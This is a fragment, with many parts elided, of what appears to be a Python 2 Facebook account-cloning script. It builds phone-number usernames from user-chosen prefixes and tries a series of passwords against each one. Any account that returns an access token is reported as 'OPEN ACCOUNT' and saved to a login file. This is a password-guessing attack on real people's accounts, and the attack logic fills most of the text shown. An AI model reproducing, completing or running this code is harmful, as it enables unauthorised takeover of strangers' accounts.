...
def menu():
    ...
    lodhirt()
    print
    jalan('\x1b[1;92m⁅\x1b[1;92m1\x1b[1;93m⁆ \x1b[0;91m≽≽≽ PAKISTAN \x1b[0;93mCLONING ჻')
    print
...
def action():
    ...
    if somi == '':
        ...
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[0;93m TYPE ANY CODE FROM \x1b[0;96m\n 905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578:\n ✎  ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[0;93m⌠OPEN ACCOUNT⌡  ' + k + c + user + '  ≻≻  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[0;97m⌠ERROR]  ' + k + c + user + '  ≻≻  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[0;93m⌠OPEN ACCOUNT⌡  ' + k + c + user +  '  ≻≻  ' + pass2
                        okb = open('save/login.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[0;97m⌠ERROR⌡  ' + k + c + user + '  ≻≻  ' + pass2
                            cps = open('save/login.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[0;93m⌠OPEN ACCOUNT⌡  ' + k + c + user + '  ≻≻  ' + pass3
                                okb = open('save/login.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[0;97m⌠ERROR⌡  ' + k + c + user + '  ≻≻  ' + pass3 
                                    cps = open('save/login.txt', 'a')
